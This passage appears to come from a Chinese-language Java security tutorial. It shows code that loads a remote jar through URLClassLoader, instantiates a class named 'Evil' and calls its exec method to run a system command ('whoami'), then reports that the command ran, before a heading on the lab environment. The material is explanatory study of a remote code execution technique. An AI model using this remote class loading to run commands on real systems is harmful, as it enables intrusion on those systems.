            // 创建URLClassLoader对象，并加载远程jar包
            java.net.URLClassLoader ucl = new java.net.URLClassLoader(new URL[]{url});

            // 定义需要执行的系统命令
            String cmd = "whoami";

            // 通过URLClassLoader加载远程jar包中的Evil类
            Class cmdClass = ucl.loadClass("Evil");

            // 调用Evil类中的exec方法
            String out = (String) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

            // 输出命令执行结果
            System.out.println(out);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

成功执行![](https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202205091855178.png)





# 0x06 实验环境